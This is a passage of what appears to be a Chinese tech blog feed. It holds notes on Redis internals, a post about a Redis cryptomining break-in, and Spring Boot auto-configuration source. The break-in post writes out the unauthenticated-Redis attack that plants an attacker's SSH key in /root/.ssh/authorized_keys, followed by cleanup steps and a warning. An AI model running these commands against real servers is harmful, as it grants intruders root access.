    <span class="token comment">// entry数量</span>
    used <span class="token operator">=</span> <span class="token function">dictSize</span><span class="token punctuation">(</span>dict<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// size > 4（哈希表初识大小）并且 负载因子低于0.1</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>size <span class="token operator">></span> DICT_HT_INITIAL_SIZE <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>used<span class="token operator">*</span><span class="token number">100</span><span class="token operator">/</span>size <span class="token operator">&lt;</span> HASHTABLE_MIN_FILL<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token keyword">int</span> <span class="token function">dictResize</span><span class="token punctuation">(</span>dict <span class="token operator">*</span>d<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> minimal<span class="token punctuation">;</span>
    <span class="token comment">// 如果正在做bgsave或bgrewriteof或rehash，则返回错误</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>dict_can_resize <span class="token operator">||</span> <span class="token function">dictIsRehashing</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span> 
        <span class="token keyword">return</span> DICT_ERR<span class="token punctuation">;</span>
    <span class="token comment">// 获取used，也就是entry个数</span>
    minimal <span class="token operator">=</span> d<span class="token operator">-></span>ht<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>used<span class="token punctuation">;</span>
    <span class="token comment">// 如果used小于4，则重置为4</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>minimal <span class="token operator">&lt;</span> DICT_HT_INITIAL_SIZE<span class="token punctuation">)</span>
        minimal <span class="token operator">=</span> DICT_HT_INITIAL_SIZE<span class="token punctuation">;</span>
    <span class="token comment">// 重置大小为minimal，其实是第一个大于等于minimal的2^n</span>
    <span class="token keyword">return</span> <span class="token function">dictExpand</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> minimal<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Dict的ReHash"><a href="#Dict的ReHash" class="headerlink" title="Dict的ReHash"></a>Dict的ReHash</h4><p>​    不管是扩容还是收缩，必定会创建新的哈希表，导致哈希表的size和sizemask变化，而key的查询与sizemask有关。因此必须对哈希表中的每一个key重新计算索引，插入新的哈希表，这个过程称为rehash。过程是这样的：</p>
<ol>
<li>计算新hash表的realeSize，值取决于当前要做的是扩容还是收缩：</li>
</ol>
<ul>
<li>如果是扩容，则新size为第一个大于等于dict.ht[0].used + 1的2^n</li>
<li>如果是收缩，则新size为第一个大于等于dict.ht[0].used的2^n （不得小于4）</li>
</ul>
<ol start="2">
<li>按照新的realeSize申请内存空间，创建dictht，并赋值给dict.ht[1]</li>
<li>设置dict.rehashidx = 0，标示开始rehash</li>
<li>将dict.ht[0]中的每一个dictEntry都rehash到dict.ht[1]</li>
<li>将dict.ht[1]赋值给dict.ht[0]，给dict.ht[1]初始化为空哈希表，释放原来的dict.ht[0]的内存</li>
</ol>
<blockquote>
<p>如果Key中的节点过多，那一次性进行Rehash就有可能导致主线程阻塞，怎么解决？</p>
</blockquote>
<p>将dict.ht[1]赋值给dict.ht[0]，给dict.ht[1]初始化为空哈希表，释放原来的dict.ht[0]的内存</p>
<ol>
<li>计算新hash表的realeSize，值取决于当前要做的是扩容还是收缩：</li>
</ol>
<ul>
<li>如果是扩容，则新size为第一个大于等于dict.ht[0].used + 1的2^n</li>
<li>如果是收缩，则新size为第一个大于等于dict.ht[0].used的2^n （不得小于4）</li>
</ul>
<ol start="2">
<li>按照新的size申请内存空间，创建dictht，并赋值给dict.ht[1]</li>
<li>设置dict.rehashidx = 0，标示开始rehash</li>
<li><strong>每次执行新增、查询、修改、删除操作时，都检查一下dict.rehashidx是否大于-1，如果是则将dict.ht[0].table[rehashidx]的entry链表rehash到dict.ht[1]，并且将rehashidx++。直至dict.ht[0]的所有数据都rehash到dict.ht[1]</strong></li>
<li>将dict.ht[1]赋值给dict.ht[0]，给dict.ht[1]初始化为空哈希表，释放原来的dict.ht[0]的内存</li>
<li>将rehashidx赋值为-1，代表rehash结束</li>
<li>在rehash过程中，新增操作，则直接写入ht[1]，查询、修改和删除则会在dict.ht[0]和dict.ht[1]依次查找并执行。这样可以确保ht[0]的数据只减不增，随着rehash最终为空</li>
</ol>
<blockquote>
<p>总结：</p>
</blockquote>
<p>Dict的结构：</p>
<ul>
<li>类似java的HashTable，底层是数组加链表来解决哈希冲突</li>
<li>Dict包含两个哈希表，ht[0]平常用，ht[1]用来rehash</li>
</ul>
<p>Dict的伸缩：</p>
<ul>
<li>当LoadFactor大于5或者LoadFactor大于1并且没有子进程任务时，Dict扩容</li>
<li>当LoadFactor小于0.1时，Dict收缩</li>
<li>扩容大小为第一个大于等于used + 1的2^n</li>
<li>收缩大小为第一个大于等于used 的2^nDict采用渐进式rehash，每次访问Dict时执行一次rehash</li>
<li>rehash时ht[0]只减不增，新增操作只在ht[1]执行，其它操作在两个哈希表</li>
</ul>
<h3 id="ZipList"><a href="#ZipList" class="headerlink" title="ZipList"></a>ZipList</h3><p>​    ZipList 是一种<strong>特殊的“双端链表”</strong> ，由一系列特殊编码的<strong>连续内存</strong>块组成。可以在<strong>任意一端进行压入/弹出</strong>操作, 并且该操作的时间复杂度为 **O(1)**。</p>
<p><img src="../../typora-user-images/image-20221126105002059.png" alt="image-20221126105002059"></p>
<p><img src="../../typora-user-images/image-20221126105045389.png" alt="image-20221126105045389"></p>
<p>​    ZipList说是特殊的来链表，但实际上并不是通过指针连接的，因为占用内存，所以Entry的结构是：</p>
<p><img src="../../typora-user-images/image-20221126105310737.png" alt="image-20221126105310737"></p>
<p>​    因为是一块儿内存，每个节点记录了前一个节点的长度，就可以计算出各个节点的位置。</p>
<blockquote>
<p>这里有一个<strong>连锁更新</strong>（Cascade Update）的问题，但作者并未修改，因为发生的概率极低、</p>
</blockquote>
<p>​    假设我们有N个连续的、长度为250~253字节之间的entry，因此entry的previous_entry_length属性用1个字节即可表示，如图所示：</p>
<p><img src="../../typora-user-images/image-20221126115032201.png" alt="image-20221126115032201"></p>
<p>​    现在在头位置插入一个新的节点，长度为254，则原先的头结点的<code>previous_entry_length</code>就会用5个字节来存储，那么该节点本身的长度就超过了254，则后续所有节点都必须更新。</p>
<p><img src="../../typora-user-images/image-20221126115247739.png" alt="image-20221126115247739"></p>
<p><img src="../../typora-user-images/image-20221126115312608.png" alt="image-20221126115312608"></p>
<blockquote>
<p>总结：</p>
</blockquote>
<ol>
<li>压缩列表的可以看做一种<strong>连续内存</strong>空间的”双向链表”</li>
<li>列表的节点之间不是通过指针连接，而是记录上一节点和本节点<strong>长度来寻址</strong>，内存占用较低</li>
<li>如果列表数据过多，导致链表过长，可能影响查询性能</li>
<li>增或删较大数据时有可能发生<strong>连续更新</strong>问题</li>
</ol>
<h3 id="QuickList"><a href="#QuickList" class="headerlink" title="QuickList"></a>QuickList</h3><blockquote>
<p>​    上面我们学习了ZipList，虽然好操作，但因为是连续的空间，所以如果长度太长，也会影响效率，并且申请更多的连续空间，</p>
</blockquote>
<p>所以我们必须限制ZipList的长度和entry大小。</p>
<blockquote>
<p>如果ZipList超出上线怎么办？</p>
</blockquote>
<p>​    利用分片思想，形成多个ZipList，但分散后又不方便管理，则推出了：QuickList。它是一个双端链表，只不过链表中的每个节点都是一个ZipList。</p>
<p><img src="../../typora-user-images/image-20221126120010880.png" alt="image-20221126120010880"></p>
<p>​    为了避免QuickList中的每个ZipList中entry过多，Redis提供了一个配置项：list-max-ziplist-size来限制。</p>
<ul>
<li>如果值为正，则代表ZipList的允许的entry个数的最大值</li>
<li>如果值为负，则代表ZipList的最大内存大小，分5种情况：<ul>
<li>-1：每个ZipList的内存占用不能超过4kb</li>
<li>-2：每个ZipList的内存占用不能超过8kb</li>
<li>-3：每个ZipList的内存占用不能超过16kb</li>
<li>-4：每个ZipList的内存占用不能超过32kb</li>
<li>-5：每个ZipList的内存占用不能超过64kb</li>
</ul>
</li>
</ul>
<p>默认值：<code>config get list-max-ziplist-size</code></p>
<p>​    除了控制ZipList的大小，QuickList还可以对节点的ZipList做<strong>压缩</strong>。通过配置项list-compress-depth来控制。因为链表一般都是从首尾访问较多，所以首尾是不压缩的。这个参数是控制首尾不压缩的节点个数：</p>
<ul>
<li>0：特殊值，代表不压缩</li>
<li>1：标示QuickList的首尾各有1个节点不压缩，中间节点压缩</li>
<li>2：标示QuickList的首尾各有2个节点不压缩，中间节点压缩</li>
<li>以此类推</li>
</ul>
<p>默认值：<code>config get list-compress-depth</code></p>
<blockquote>
<p>源码：</p>
</blockquote>
<p><img src="../../typora-user-images/image-20221126120353527.png" alt="image-20221126120353527"></p>
<p><img src="../../typora-user-images/image-20221126120419505.png" alt="image-20221126120419505"></p>
<blockquote>
<p>特点：</p>
</blockquote>
<ol>
<li>是一个节点为ZipList的双端链表</li>
<li>节点采用ZipList，解决了传统链表的内存占用问题</li>
<li>控制了ZipList大小，解决连续内存空间申请效率问题</li>
<li>中间节点可以压缩，进一步节省了内存</li>
</ol>
<h3 id="kipList"><a href="#kipList" class="headerlink" title="kipList"></a>kipList</h3><blockquote>
<p>​    原有链表的一个问题，就是查找元素时，需要一个个遍历，每个节点有一个指针指向下一个元素，那能不能多加几个指针？</p>
</blockquote>
<p>跳表的结构图：</p>
<p><img src="../../typora-user-images/image-20221126120643605.png" alt="image-20221126120643605"></p>
<p>可以看到跳表的一个特性就是有序，如果无序，则多出来的指针没有意义。</p>
<p><img src="../../typora-user-images/image-20221126120833282.png" alt="image-20221126120833282"></p>
<blockquote>
<p>总结：</p>
</blockquote>
<ol>
<li>跳跃表是一个双向链表，每个节点都包含score和ele值</li>
<li>节点按照score值排序，score值一样则按照ele字典排序</li>
<li>每个节点都可以包含多层指针，层数是1到32之间的随机数</li>
<li>不同层指针到下一个节点的跨度不同，层级越高，跨度越大</li>
<li>增删改查效率与红黑树基本一致，实现却更简单</li>
</ol>
<h3 id="RedisObject"><a href="#RedisObject" class="headerlink" title="RedisObject"></a>RedisObject</h3><p>Redis中的任意数据类型<code>(String,List,Set,Hash,ZSet)</code>都会被封装为RedisObject对象。</p>
<p><img src="../../typora-user-images/image-20221126121217400.png" alt="image-20221126121217400"></p>
<h4 id="底层编码方式"><a href="#底层编码方式" class="headerlink" title="底层编码方式"></a>底层编码方式</h4><p>Redis中会根据存储的数据类型不同，选择不同的编码方式，共包含11种不同类型：</p>
<p><img src="../../typora-user-images/image-20221126121318276.png" alt="image-20221126121318276"></p>
<h4 id="五种数据类型的底层类型："><a href="#五种数据类型的底层类型：" class="headerlink" title="五种数据类型的底层类型："></a>五种数据类型的底层类型：</h4><table>
<thead>
<tr>
<th align="left"><strong>数据类型</strong></th>
<th><strong>编码方式</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left">OBJ_STRING</td>
<td>int、embstr、raw</td>
</tr>
<tr>
<td align="left">OBJ_LIST</td>
<td>LinkedList和ZipList(3.2以前)、QuickList（3.2以后）</td>
</tr>
<tr>
<td align="left">OBJ_SET</td>
<td>intset、HT</td>
</tr>
<tr>
<td align="left">OBJ_ZSET</td>
<td>ZipList、HT、SkipList</td>
</tr>
<tr>
<td align="left">OBJ_HASH</td>
<td>ZipList、HT</td>
</tr>
</tbody></table>
<h2 id="五种数据类型"><a href="#五种数据类型" class="headerlink" title="五种数据类型"></a>五种数据类型</h2><h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><p>我们知道底层是通过SDS结构，但不同的SDS长度会使用不同的编码。</p>
<p>如果存储的是字符串是整数值，大小在Long_MAX范围内，则会使用INT编码，直接将数据保存在RedisObject的ptr指针位置（刚好8字节），<strong>不再需要SDS了</strong>。</p>
<p><img src="../../typora-user-images/image-20221126121746597.png" alt="image-20221126121746597"></p>
<p>如果存储的SDS长度小于44字节，则会采用EMBSTR编码，此时object head与SDS是一段连续空间。申请内存时只需要调用一次内存分配函数，效率更高。</p>
<p><img src="../../typora-user-images/image-20221126121826644.png" alt="image-20221126121826644"></p>
<p>否则用的就是raw编码了，SDS单独占一个内存，RedisObject用指针连接</p>
<p><img src="../../typora-user-images/image-20221126121919607.png" alt="image-20221126121919607"></p>
<h3 id="List"><a href="#List" class="headerlink" title="List"></a>List</h3><blockquote>
<p>我们可以自己想一想，底层结构中哪个合适?</p>
</blockquote>
<p>List操作需要可以从两端插入或弹出，范围读取。</p>
<p>SDS是字符串（❎），intSet是完整的内存，支持有序，唯一（❎），Dict无法双端操作（❎）</p>
<p>ZipList：完整内存，双端操作，范围读取（✅）</p>
<p>QuickList：LinkedList + ZipList，可以从双端访问，内存占用较低，包含多个ZipList，存储上限高（✅）</p>
<ul>
<li>在3.2版本之前，Redis采用ZipList和LinkedList来实现List，当元素数量小于512并且元素大小小于64字节时采用ZipList编码，超过则采用LinkedList编码。</li>
<li>在3.2版本之后，Redis统一采用QuickList来实现List</li>
</ul>
<h3 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h3><p>Set需要元素唯一（可判断是否元素存在），不保证有序，求交集，并集，差集，也就是对查询效率要求很高</p>
<p>我们能想到Java中，利用Map实现Set结构，Value存Null，那在Redis中应该也可以，所以Dict(✅)</p>
<p>IntSet内部是整数数组，不过可以保证唯一，且有序，二分查询也快。当存储的所有数据都是整数，并且元素数量不超过set-max-intset-entries时，Set会采用IntSet编码，以节省内存，IntSet(✅)</p>
<h3 id="ZSet"><a href="#ZSet" class="headerlink" title="ZSet"></a>ZSet</h3><p>ZSet也就是SortedSet，其中每一个元素都需要指定一个score值和member值。要求：</p>
<p>可以根据score值排序，member必须唯一，可以根据member查询分数</p>
<ol>
<li>那想到第一个应该是Dict结构，key为member，value为score，可以保证member唯一，✅</li>
<li>然后有分数的就是SkipList，可以排序，并且可以同时存储score和ele值（member）✅</li>
<li>当元素数量不多时，HT和SkipList的优势不明显，而且更耗内存。因此zset还会采用ZipList结构来节省内存，不过需要同时满足两个条件：✅<ol>
<li>元素数量小于zset_max_ziplist_entries，默认值128</li>
<li>每个元素都小于zset_max_ziplist_value字节，默认值64</li>
</ol>
</li>
</ol>
<blockquote>
<p>ziplist本身没有排序功能，而且没有键值对的概念，因此需要有zset通过编码实现：</p>
</blockquote>
<ol>
<li>ZipList是连续内存，因此score和element是紧挨在一起的两个entry， element在前，score在后</li>
<li>score越小越接近队首，score越大越接近队尾，按照score值升序排列</li>
</ol>
<p><img src="../../typora-user-images/image-20221126123840996.png" alt="image-20221126123840996"></p>
<h3 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h3><p>需求：</p>
<ol>
<li>键值存储</li>
<li>根据键获取值</li>
<li>键唯一</li>
</ol>
<p>我们发现与Zset需求很相似</p>
<ol>
<li>zset的键是member，值是score；hash的键和值都是任意值</li>
<li>zset要根据score排序；hash则无需排序</li>
</ol>
<p>因此，Hash底层采用的编码与Zset也基本一致，只需要把排序有关的SkipList去掉即可。也就是剩下ZipList和Dict</p>
<ul>
<li><p>Hash结构默认采用ZipList编码，用以节省内存。 ZipList中相邻的两个entry 分别保存field和value ✅</p>
</li>
<li><p>当数据量较大时，Hash结构会转为HT编码，也就是Dict，触发条件有两个： ✅</p>
<ul>
<li>ZipList中的元素数量超过了hash-max-ziplist-entries（默认512）</li>
<li>ZipList中的任意entry大小超过了hash-max-ziplist-value（默认64字节）</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis挖矿分析</title>
    <url>//post/Redis/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%BD%93%E4%BD%A0%E5%AD%A6%E4%B9%A0Redis%EF%BC%8C%E5%8F%91%E7%8E%B0%E8%87%AA%E5%B7%B1%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9C%A8%E6%8C%96%E7%9F%BF%E4%BA%86.html</url>
    <content><![CDATA[<h1 id="为什么当你学习Redis，发现自己的服务器在挖矿了"><a href="#为什么当你学习Redis，发现自己的服务器在挖矿了" class="headerlink" title="为什么当你学习Redis，发现自己的服务器在挖矿了"></a>为什么当你学习Redis，发现自己的服务器在挖矿了</h1><p>​    在我学习Redis时，因为嫌麻烦就没有设置密码，结果导致一段时间后系统提醒我，我的服务器上有挖矿行为，如果不清理就停止运行，我一脸懵逼，并不断上网查找哪里出现问题了，但最终还是没有解决，无奈下我初始化了服务器。希望本篇文章能对你有锁帮助，顺利让你体会到入侵自己服务器的感觉。</p>
<h2 id="你是如何连接服务器的？"><a href="#你是如何连接服务器的？" class="headerlink" title="你是如何连接服务器的？"></a>你是如何连接服务器的？</h2><p>​    在最初我们购买好自己的服务器后，要么在服务器厂商页面进行安全连接，要么通过<code>SSH 用户名@密码</code>方式进行连接，例如下图：</p>
<p><img src="../../typora-user-images/image-20221017171909179.png" alt="image-20221017171909179"></p>
<p>​    但到后面我们发现每次都需要输入密码，也太麻烦了，可以利用秘钥登陆服务器。那如何获取到你的秘钥呢？</p>
<ol>
<li><p>客户端通过命令行模式输入：<code>ssh-keygen</code>生成自己的公钥和私钥（这里可以指定参数，具体自己查）。</p>
<p><img src="../../typora-user-images/image-20221017172559852.png" alt="image-20221017172559852"></p>
</li>
<li><p>手动将客户端的公钥放入远程<a href="https://cloud.tencent.com/product/cvm?from=10680">服务器</a>的指定位置,/root/.ssh/authorized_keys。</p>
<p><img src="../../typora-user-images/image-20221017173030351.png" alt="image-20221017173030351"></p>
</li>
<li><p>现在我们再通过ssh进行登陆，可以看到直接登陆到服务器了</p>
</li>
</ol>
<p><img src="../../typora-user-images/image-20221017173225460.png" alt="image-20221017173225460"></p>
<p>那说了这么多，我们发现只要服务器上有你的秘钥，你就可以直接进行登陆，不需要设置密码。那这和Redis有啥关系呢？</p>
<h2 id="你是如何连接Redis的？"><a href="#你是如何连接Redis的？" class="headerlink" title="你是如何连接Redis的？"></a>你是如何连接Redis的？</h2><p>通常有三种：</p>
<ol>
<li>在服务器中使用<code>redis-cli</code>进行操作</li>
<li>在代码中连接使用</li>
<li>在本地远程连接使用：<code>redis-cli -h IP地址</code></li>
</ol>
<p>而我们最长使用的就是使用代码进行连接，因此需要修改Redis的配置文件。来运行我们远程访问。修改一下参数：</p>
<ol>
<li><code>protected-mode no</code></li>
<li><code>bind 0.0.0.0</code></li>
</ol>
<p>​    如果你忘了设置密码了，当Redis重新加载配置文件后，理论上你能访问到的同时，别人只要知道你的IP地址，也就能操作你的Redis了，下图显示本地可以直接访问，并进行操作了。</p>
<p><img src="../../typora-user-images/image-20221017175943082.png" alt="image-20221017175943082"></p>
<p>​    接下来我们对Redis存储一些值，输入：<code>cat 你的公钥本地地址 | redis-cli -h 服务器IP地址 -x set crackit</code></p>
<p><img src="../../typora-user-images/image-20221017180431887.png" alt="image-20221017180431887"></p>
<p>​    通过上面的指令，我们已经成功的将公钥值放入Redis中了，并可以查询到。</p>
<blockquote>
<p>192.168.1.11:6379&gt; config set dir /root/.ssh/    配置地址设置</p>
<p>OK </p>
<p>192.168.1.11:6379&gt; config get dir </p>
<ol>
<li>“dir” 2) “/root/.ssh” </li>
</ol>
<p>192.168.1.11:6379&gt; config set dbfilename “authorized_keys”</p>
<p>OK</p>
<p>192.168.1.11:6379&gt; save </p>
<p>OK</p>
</blockquote>
<p>​    上面相当于把你redis中存储的值直接保存到了<code>/root/.ssh/authorized_keys </code>这个文件里,这不就是我们远程连接设置秘钥的地方嘛，我草！！！，所以这时候你的服务器已经可以让别人进出无阻了，想干嘛干嘛了。关键这不是最恶心人的。当服务器厂商对你提醒后，你去检查你的秘钥，发现真的多出来一个，你想删却发现没有权限。如果运气好你可以在定时任务中找到莫名奇妙的任务，你删掉，但并没什么用，相当于你家大门已经没有了，你疯狂的上网搜索，发现可以用<code>chattr</code>来修改文件权限，但惊奇的发现chatter这个指令不存在，是的，人家把你的大砍刀也直接顺走了。我们一步步来解决。</p>
<ol>
<li><p>首先我们需要chatter来修改文件属性，但是显示指令不存在</p>
<ol>
<li>使用：<code>yum -y install e2fsprogs</code>,但是可能显示该包已经存在</li>
<li>直接：<code>yum remove e2fsprogs</code>卸载之前的，然后从新下载。</li>
</ol>
</li>
<li><p>这时候看chatter应该是可以用了</p>
<ol>
<li><p>使用：<code>lsattr authorized_keys</code>，去检查该文件</p>
<p><img src="../../typora-user-images/image-20221017185101472.png" alt="image-20221017185101472"></p>
</li>
<li><p>如果是这种情况说明文件已经被锁定了，我们使用：<code>chattr -ia authorized_keys </code>也就是去掉这两个属性。</p>
</li>
</ol>
</li>
<li><p>这时候该文件已经可以被chmod修改权限了，使用<code>chmod 777 authorized_keys</code></p>
</li>
<li><p>如果上面都没问题，使用：<code>rm -f authorized_keys</code> 直接删除。</p>
</li>
<li><p>最后检查定时任务之类的。</p>
</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    由于攻击是我亲身经历的，让我们烦恼了好一阵子，所以在这里写下来，希望能对你有所帮助。不要在服务器上尝试我上述的打开Redis权限的步骤，因为你大概率十分钟之内就被攻击了。别不信，我就是这么被攻击的。</p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>网络攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot自动装配原理</title>
    <url>//post/Spring/SpringBoot%20%E8%87%AA%E5%8A%A8%E8%A3%85%E9%85%8D%E5%8E%9F%E7%90%86.html</url>
    <content><![CDATA[<h1 id="SpringBoot-自动装配原理"><a href="#SpringBoot-自动装配原理" class="headerlink" title="SpringBoot 自动装配原理"></a>SpringBoot 自动装配原理</h1><h2 id="SpringBootApplication-启动注解"><a href="#SpringBootApplication-启动注解" class="headerlink" title="@SpringBootApplication 启动注解"></a>@SpringBootApplication 启动注解</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@SpringBootApplication</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringBootBasicLearnApplication</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">SpringApplication</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">SpringBootBasicLearnApplication</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>


	<span class="token comment">/**
	 * to store the base package from the importing configuration
	 * 也就是获取到我们启动类的包路径
	 */</span>
	<span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Registrar</span> <span class="token keyword">implements</span> <span class="token class-name">ImportBeanDefinitionRegistrar</span><span class="token punctuation">,</span> <span class="token class-name">DeterminableImports</span> <span class="token punctuation">&#123;</span>

		<span class="token annotation punctuation">@Override</span>
		<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">registerBeanDefinitions</span><span class="token punctuation">(</span><span class="token class-name">AnnotationMetadata</span> metadata<span class="token punctuation">,</span> <span class="token class-name">BeanDefinitionRegistry</span> registry<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token comment">// 这里注入容器，将我们的包路径信息封装成一个Bean</span>
			<span class="token function">register</span><span class="token punctuation">(</span>registry<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">PackageImports</span><span class="token punctuation">(</span>metadata<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPackageNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>

		<span class="token annotation punctuation">@Override</span>
		<span class="token keyword">public</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> <span class="token function">determineImports</span><span class="token punctuation">(</span><span class="token class-name">AnnotationMetadata</span> metadata<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">return</span> <span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">singleton</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PackageImports</span><span class="token punctuation">(</span>metadata<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>

	<span class="token punctuation">&#125;</span>



<span class="token comment">// BeanClassLoaderAware,ResourceLoaderAware 这些表示可以获取Aware前的信息</span>
<span class="token comment">// Ordered 表示Bean注入排序</span>
<span class="token comment">// 关键是这个： DeferredImportSelector  延迟导入选择器  extends </span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AutoConfigurationImportSelector</span> <span class="token keyword">implements</span> <span class="token class-name">DeferredImportSelector</span><span class="token punctuation">,</span> <span class="token class-name">BeanClassLoaderAware</span><span class="token punctuation">,</span>
		<span class="token class-name">ResourceLoaderAware</span><span class="token punctuation">,</span> <span class="token class-name">BeanFactoryAware</span><span class="token punctuation">,</span> <span class="token class-name">EnvironmentAware</span><span class="token punctuation">,</span> <span class="token class-name">Ordered</span>
      
      
      
<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">DeferredImportSelector</span> <span class="token keyword">extends</span> <span class="token class-name">ImportSelector</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 这里是接口的定义方法，具体实现看AutoConfigurationImportSelector</span>
		<span class="token keyword">void</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token class-name">AnnotationMetadata</span> metadata<span class="token punctuation">,</span> <span class="token class-name">DeferredImportSelector</span> selector<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token annotation punctuation">@Override</span>
		<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token class-name">AnnotationMetadata</span> annotationMetadata<span class="token punctuation">,</span> <span class="token class-name">DeferredImportSelector</span> deferredImportSelector<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token class-name">AutoConfigurationEntry</span> autoConfigurationEntry <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">AutoConfigurationImportSelector</span><span class="token punctuation">)</span> deferredImportSelector<span class="token punctuation">)</span>
           <span class="token comment">// 这里是核心，获取自动配置的实例，通过元数据 ！！！ </span>
					<span class="token punctuation">.</span><span class="token function">getAutoConfigurationEntry</span><span class="token punctuation">(</span>annotationMetadata<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">this</span><span class="token punctuation">.</span>autoConfigurationEntries<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>autoConfigurationEntry<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> importClassName <span class="token operator">:</span> autoConfigurationEntry<span class="token punctuation">.</span><span class="token function">getConfigurations</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">this</span><span class="token punctuation">.</span>entries<span class="token punctuation">.</span><span class="token function">putIfAbsent</span><span class="token punctuation">(</span>importClassName<span class="token punctuation">,</span> annotationMetadata<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>


<span class="token keyword">protected</span> <span class="token class-name">AutoConfigurationEntry</span> <span class="token function">getAutoConfigurationEntry</span><span class="token punctuation">(</span><span class="token class-name">AnnotationMetadata</span> annotationMetadata<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isEnabled</span><span class="token punctuation">(</span>annotationMetadata<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">return</span> <span class="token constant">EMPTY_ENTRY</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
  	<span class="token comment">// 获取EnableAutoConfiguration注解中定义的exclude排除的Bean类</span>
		<span class="token class-name">AnnotationAttributes</span> attributes <span class="token operator">=</span> <span class="token function">getAttributes</span><span class="token punctuation">(</span>annotationMetadata<span class="token punctuation">)</span><span class="token punctuation">;</span>
  	<span class="token comment">// 这里获取候选配置，是关键！！！</span>
		<span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> configurations <span class="token operator">=</span> <span class="token function">getCandidateConfigurations</span><span class="token punctuation">(</span>annotationMetadata<span class="token punctuation">,</span> attributes<span class="token punctuation">)</span><span class="token punctuation">;</span>
